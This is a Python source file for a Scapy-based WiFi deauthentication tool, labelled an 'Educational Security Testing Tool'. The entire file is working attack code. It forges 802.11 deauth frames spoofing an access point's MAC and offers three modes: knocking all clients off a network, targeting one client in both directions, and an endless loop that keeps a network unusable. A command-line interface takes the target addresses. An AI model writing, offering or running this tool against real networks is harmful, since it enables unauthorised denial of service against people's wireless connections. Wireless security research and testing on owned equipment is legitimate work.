#!/usr/bin/env python3
"""
Deauther Module - Scapy-based WiFi Deauthentication
Educational Security Testing Tool
"""

import sys
import argparse
from scapy.all import *

def deauth_attack(bssid, interface, count=100):
    """
    Send deauthentication packets to target AP
    """
    print(f"[+] Starting deauth attack on {bssid}")
    print(f"[+] Interface: {interface}")
    print(f"[+] Sending {count} deauth packets...")
    
    # Create deauth packet (broadcast to all clients)
    # Reason code 3 = Class 3 frame received from nonassociated STA
    deauth_pkt = RadioTap() / Dot11(
        addr1="ff:ff:ff:ff:ff:ff",  # Destination (broadcast)
        addr2=bssid,                  # Source (AP)
        addr3=bssid                   # BSSID
    ) / Dot11Deauth(reason=3)
    
    try:
        # Send packets
        sendp(deauth_pkt, iface=interface, count=count, inter=0.1, verbose=True)
        print(f"[✓] Sent {count} deauth packets")
    except Exception as e:
        print(f"[✗] Error sending packets: {e}")
        sys.exit(1)

def targeted_deauth(bssid, client_mac, interface, count=100):
    """
    Send targeted deauthentication packets to specific client
    """
    print(f"[+] Starting targeted deauth attack")
    print(f"[+] Target AP: {bssid}")
    print(f"[+] Target Client: {client_mac}")
    print(f"[+] Interface: {interface}")
    
    # Deauth from AP to client
    pkt1 = RadioTap() / Dot11(
        addr1=client_mac,  # Destination (client)
        addr2=bssid,       # Source (AP)
        addr3=bssid        # BSSID
    ) / Dot11Deauth(reason=3)
    
    # Deauth from client to AP
    pkt2 = RadioTap() / Dot11(
        addr1=bssid,       # Destination (AP)
        addr2=client_mac,  # Source (client)
        addr3=bssid        # BSSID
    ) / Dot11Deauth(reason=3)
    
    try:
        # Send packets alternately
        for i in range(count):
            sendp(pkt1, iface=interface, verbose=False)
            sendp(pkt2, iface=interface, verbose=False)
            time.sleep(0.1)
        print(f"[✓] Sent {count} deauth packets to {client_mac}")
    except Exception as e:
        print(f"[✗] Error sending packets: {e}")
        sys.exit(1)

def continuous_deauth(bssid, interface, interval=2):
    """
    Continuous deauth attack with specified interval
    """
    print(f"[+] Starting continuous deauth attack on {bssid}")
    print(f"[+] Interface: {interface}")
    print(f"[+] Interval: {interval} seconds")
    print("[+] Press Ctrl+C to stop")
    
    deauth_pkt = RadioTap() / Dot11(
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=bssid,
        addr3=bssid
    ) / Dot11Deauth(reason=3)
    
    try:
        while True:
            sendp(deauth_pkt, iface=interface, count=5, verbose=False)
            print(f"[*] Sent 5 deauth packets to {bssid}")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[!] Deauth attack stopped")
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="WiFi Deauthentication Tool")
    parser.add_argument('--bssid', required=True, help='Target BSSID (AP MAC address)')
    parser.add_argument('--interface', required=True, help='Wireless interface in monitor mode')
    parser.add_argument('--client', help='Target client MAC (for targeted attack)')
    parser.add_argument('--count', type=int, default=100, help='Number of packets to send')
    parser.add_argument('--interval', type=int, default=2, help='Interval for continuous mode (seconds)')
    parser.add_argument('--continuous', action='store_true', help='Enable continuous deauth mode')
    
    args = parser.parse_args()
    
    # Validate BSSID format
    if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', args.bssid):
        print("[✗] Invalid BSSID format")
        sys.exit(1)
    
    if args.client:
        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', args.client):
            print("[✗] Invalid client MAC format")
            sys.exit(1)
        targeted_deauth(args.bssid, args.client, args.interface, args.count)
    elif args.continuous:
        continuous_deauth(args.bssid, args.interface, args.interval)
    else:
        deauth_attack(args.bssid, args.interface, args.count)

if __name__ == "__main__":
    import re
    import time
    main()
